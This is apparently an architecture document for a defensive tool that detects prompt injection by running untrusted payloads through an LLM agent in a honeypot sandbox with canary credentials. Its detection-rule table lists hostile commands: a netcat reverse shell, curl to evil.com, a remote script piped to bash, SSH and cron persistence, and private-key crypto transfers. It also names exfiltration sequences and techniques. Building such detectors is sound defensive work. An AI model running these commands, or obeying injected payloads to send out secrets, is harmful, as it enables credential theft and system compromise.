# Architecture

Detonation Tool is a prompt injection detection system that runs untrusted payloads
through a real LLM agent in a honeypot sandbox and monitors for exfiltration attempts
across multiple independent detection layers.

## High-Level Design

```
┌─────────────────────────────────────────────────────────────┐
│                     detonate CLI                             │
│                                                             │
│  Payload ──► PiAgent.detonate() ──► JSON Report ──► stdout │
│                      │                                      │
│              ┌───────┴──────────┐                           │
│              │   Sandbox Setup  │                           │
│              │   /tmp/daas-*   │                           │
│              └─────────────────┘                           │
└─────────────────────────────────────────────────────────────┘
```

The tool is a **standalone binary** with no server component. It:

1. Generates cryptographically random honeypot credentials ("canaries")
2. Writes them to a real filesystem sandbox at `/tmp/daas-sandbox-<uuid>/`
3. Starts a network canary HTTP server on a random port
4. Spawns a real `pi` subprocess with bash/read/write/edit tools in the sandbox
5. Feeds the untrusted payload as the agent's instruction
6. Parses Pi's JSONL output stream in real-time
7. Runs all detection layers against every tool call and text output
8. Kills the Pi process, cleans up the sandbox, outputs the report

## Core Data Flow

```
                ┌──────────────────┐
                │  CanaryGenerator │──► 8 honeypot credentials
                └──────────────────┘
                         │
                         ▼
                ┌──────────────────┐
                │ HoneypotBuilder  │──► ~/.aws/credentials, ~/.env, etc.
                └──────────────────┘
                         │
                         ▼
                ┌──────────────────┐
                │  NetworkCanary   │──► HTTP server on random port
                │  (HTTP server)   │    URL planted in .env as WEBHOOK_URL
                └──────────────────┘
                         │
                         ▼
                ┌──────────────────┐
                │    PiAgent       │──► Spawns `pi --mode json ...`
                │  (subprocess)    │    Real bash, read, write, edit tools
                └──────────────────┘
                         │
              ┌──────────┼──────────┐
              ▼          ▼          ▼
        ┌─────────┐ ┌─────────┐ ┌─────────┐
        │ Layer 1 │ │ Layer 2 │ │ Layer 3 │
        │ Canary  │ │Behavior │ │ Traffic │
        │ Monitor │ │Analyzer │ │ Capture │
        └─────────┘ └─────────┘ └─────────┘
              │          │          │
              ▼          ▼          ▼
        ┌─────────────────────────────────────┐
        │        ReportBuilder                │
        │  (multi-layer verdict + confidence)  │
        └─────────────────────────────────────┘
                         │
                         ▼
                ┌──────────────────┐
                │   JSON Report    │──► stdout + exit code
                └──────────────────┘
```

## Detection Layers

### Layer 1: CanaryMonitor

**What it catches:** Canary values appearing in LLM text output or tool call arguments.

**Matching strategies:**
- **Exact match**: `text.contains(&canary.value)` — catches verbatim regurgitation
- **Fuzzy prefix match**: First N characters of a canary appearing in text (e.g., `AKIAIOSFODN...`)
- **Fuzzy suffix match**: Last N characters of a canary appearing in text

**Severity classification:**
- Canary in outbound tool (`curl`, `send_email`, `http_post`) → **Critical** (confirmed exfiltration)
- Canary in bidirectional tool (`write_file`) → **Medium** (suspicious)
- Canary in inbound tool (`read_file`) → **Info** (expected — LLM is supposed to read secrets)

### Layer 2: BehavioralAnalyzer

**What it catches:** Suspicious bash command patterns, even without canary values.

**Detection rules** (10+ types):
| Pattern | Example | Severity |
|---------|---------|----------|
| Reverse shell | `nc -e /bin/bash 1.2.3.4 4443` | **Critical** |
| Outbound network | `curl https://evil.com` | **High** |
| Crypto transaction | `cast send --private-key 0x... --to 0x...` | **Critical** |
| Obfuscated command | `echo 'base64...' \| base64 -d \| bash` | **High** |
| SSH persistence | `echo 'key' >> ~/.ssh/authorized_keys` | **Critical** |
| Cron persistence | `(crontab -l; echo '...') \| crontab -` | **Critical** |
| Remote script exec | `curl https://evil.com/script.sh \| bash` | **Critical** |
| External API call | `curl https://api.stripe.com/...` | **Critical** |
| Git config manipulation | `git remote add malicious ...` | **High** |
| Shell profile modification | `echo 'export ...' >> ~/.bashrc` | **High** |
| CI/CD manipulation | Writing to `.github/workflows/` | **Critical** |

**Sequence analysis:** Detects patterns across multiple tool calls:
- Read `.aws/credentials` → `curl https://evil.com` → **Critical** (exfiltration pattern)
- Read `.env` → `cast send --private-key` → **Critical** (theft pattern)

### Layer 3: TrafficCapture

**What it catches:** Network-related commands extracted from bash tool calls.

**Parsed protocols:**
- HTTP/HTTPS (curl, wget)
- TCP/UDP (nc, ncat)
- SSH/SCP
- DNS (dig, nslookup, host)
- HTTP via scripting (python requests, node fetch)
- Blockchain RPC (cast, forge, solana)

**Expected destination filtering:** Traffic to known APIs (OpenAI, Anthropic, Ollama, etc.)
and localhost are filtered out. Everything else is flagged as unexpected.

### Layer 4: NetworkCanary

**What it catches:** Any HTTP request the test agent makes to a monitored endpoint.

**How it works:**
1. A real HTTP server starts on `127.0.0.1:<random-port>` before the test Pi runs
2. The canary URL is planted in the honeypot as `WEBHOOK_URL` in `.env` and in `config/webhooks.yml`
3. If the test Pi makes ANY HTTP request to this URL, it's caught with full request details
4. Every hit generates a **Critical** severity exfiltration event

**What's captured per hit:**
- HTTP method (GET, POST, etc.)
- Request path
- Headers (custom headers that might encode stolen data)
- Request body
- Source IP and port
- Exact timestamp

### Layer 5: TrafficReviewer (LLM-based)

**What it catches:** Subtle exfiltration patterns that regex can't detect.

**How it works:**
1. After the test Pi finishes, the traffic log is sent to a **separate LLM call**
2. The LLM (configured via `DAAS_TRAFFIC_REVIEW_MODEL`) analyzes the traffic for:
   - DNS exfiltration (data encoded in subdomain queries)
   - HTTP headers with suspicious custom fields
   - Webhook calls forwarding stolen data
   - Crypto RPC connections
   - Base64/hex encoded payloads
   - Split exfiltration across multiple small requests
3. Falls back to rule-based analysis if the LLM call fails

## Report Building

The `ReportBuilder::from_pi_result()` function produces a `DetonationReport`:

```rust
pub struct DetonationReport {
    pub verdict: Verdict,              // Safe | Suspicious | Malicious | Error
    pub confidence: f32,               // 0.0 to 1.0
    pub exfiltration_events: Vec<...>, // All confirmed exfil attempts
    pub behavioral_timeline: Vec<...>, // Chronological event log
    pub payload_analysis: String,      // Human-readable analysis
}
```

**Verdict logic:**
- `Malicious` if ANY layer confirmed exfiltration (canary in outbound channel, network canary hit, critical traffic review, critical behavioral flag)
- `Suspicious` if some indicators fire but no confirmed exfil (unexpected traffic, file access, max turns reached)
- `Safe` if nothing detected across all layers

**Confidence calculation:** Base 50%, +20% for canary exfil, +15% for network canary hit, +15% for critical traffic review, +10% for traffic review findings, +5% for unexpected traffic. Capped at 100%.

## LLM Provider Detection

The tool auto-detects which LLM provider to use for the test agent:

1. **CLI flags** (`--provider`, `--model`) — highest priority
2. **Environment variables** (`DAAS_LLM_PROVIDER`, `DAAS_LLM_MODEL`, `DAAS_LLM_API_KEY`)
3. **Auto-detection**:
   - If `OPENAI_API_KEY` or `ANTHROPIC_API_KEY` is set, use that provider
   - Default: Ollama at `http://localhost:11434/v1` (no API key needed)

The test agent is a **completely separate Pi process** with its own LLM connection.
It has no relationship to the calling Pi's model or configuration.

## Exit Codes

| Code | Meaning | Use Case |
|------|---------|----------|
| 0 | Safe | Payload is safe to process |
| 1 | Suspicious | Escalate to human review |
| 2 | Malicious | Block immediately |
| 3 | Error | Configuration or runtime error |

## Filesystem Sandbox

The sandbox is created at `/tmp/daas-sandbox-<uuid>/` with this structure:

```
/tmp/daas-sandbox-<uuid>/
├── home/agent/
│   ├── .aws/
│   │   ├── credentials      # AWS access key + secret key
│   │   └── config           # AWS region config
│   ├── .ssh/
│   │   ├── id_ed25519       # SSH private key (PEM)
│   │   ├── known_hosts      # GitHub host key
│   │   └── config            # SSH config
│   ├── .env                  # Stripe, GitHub, DB, ETH, Slack, API keys
│   ├── config/
│   │   ├── app.conf          # Application config with secrets
│   │   └── webhooks.yml      # Webhook URL (network canary) if enabled
│   ├── secrets/
│   │   ├── aws-access-key-id
│   │   ├── aws-secret-access-key
│   │   └── eth-wallet-key
│   ├── README.md             # Innocent workspace readme
│   ├── .bashrc               # Shell config
│   ├── .gitconfig            # Git config
│   └── projects/
│       └── notes.txt         # Innocent meeting notes
```

The sandbox is cleaned up asynchronously after the detonation completes.
